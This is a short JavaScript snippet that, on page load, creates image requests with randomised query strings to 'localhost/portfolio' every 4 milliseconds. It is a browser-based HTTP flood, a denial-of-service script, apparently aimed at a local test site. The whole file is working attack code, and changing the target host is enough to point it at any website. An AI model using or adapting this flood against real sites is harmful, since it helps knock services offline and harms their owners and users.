window.onload = function () {
  function imgFlood() {
    const website = 'localhost/portfolio';
    const uri = '?';
    const pic = new Image();
    const rand = Math.floor(Math.random() * 1000);
    pic.src = 'http://' + website + uri + rand + `=${rand}`;
  }

  setInterval(imgFlood, 4);
};
